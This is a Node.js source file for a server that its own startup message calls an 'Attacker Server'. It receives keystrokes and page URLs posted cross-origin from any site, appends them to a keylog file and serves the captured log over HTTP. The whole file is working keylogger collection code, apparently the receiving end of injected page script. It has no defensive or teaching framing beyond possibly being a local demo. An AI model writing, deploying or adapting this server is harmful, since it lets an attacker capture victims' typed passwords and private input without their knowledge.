const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');

const PORT = 8888;
const KEYLOG_FILE = path.join(__dirname, 'keylog.txt');

// CORS headers for cross-origin requests
const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'POST, GET, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Content-Type': 'application/json'
};

const server = http.createServer((req, res) => {
  const parsedUrl = url.parse(req.url, true);
  
  // Handle CORS preflight
  if (req.method === 'OPTIONS') {
    res.writeHead(200, corsHeaders);
    res.end();
    return;
  }
  
  // Handle keylogger POST requests
  if (req.method === 'POST' && parsedUrl.pathname === '/keylog') {
    let body = '';
    
    req.on('data', chunk => {
      body += chunk.toString();
    });
    
    req.on('end', () => {
      try {
        const data = JSON.parse(body);
        const timestamp = new Date().toISOString();
        const logEntry = `[${timestamp}] Key: "${data.key}" | URL: ${data.url}\n`;
        
        // Append to keylog file
        fs.appendFileSync(KEYLOG_FILE, logEntry);
        
        console.log(`[${timestamp}] Received keystroke: "${data.key}" from ${data.url}`);
        
        res.writeHead(200, corsHeaders);
        res.end(JSON.stringify({ status: 'logged' }));
      } catch (error) {
        console.error('Error parsing keylog data:', error);
        res.writeHead(400, corsHeaders);
        res.end(JSON.stringify({ error: 'Invalid JSON' }));
      }
    });
    return;
  }
  
  // Handle GET request to view logs
  if (req.method === 'GET' && parsedUrl.pathname === '/logs') {
    try {
      const logs = fs.readFileSync(KEYLOG_FILE, 'utf8');
      res.writeHead(200, { ...corsHeaders, 'Content-Type': 'text/plain' });
      res.end(logs || 'No logs yet.');
    } catch (error) {
      res.writeHead(200, { ...corsHeaders, 'Content-Type': 'text/plain' });
      res.end('No logs yet.');
    }
    return;
  }
  
  // Default response
  res.writeHead(404, corsHeaders);
  res.end(JSON.stringify({ error: 'Not found' }));
});

server.listen(PORT, () => {
  console.log(`🚨 Attacker Server running on http://localhost:${PORT}`);
  console.log(`📝 Keylog file: ${KEYLOG_FILE}`);
  console.log(`📊 View logs at: http://localhost:${PORT}/logs`);
});
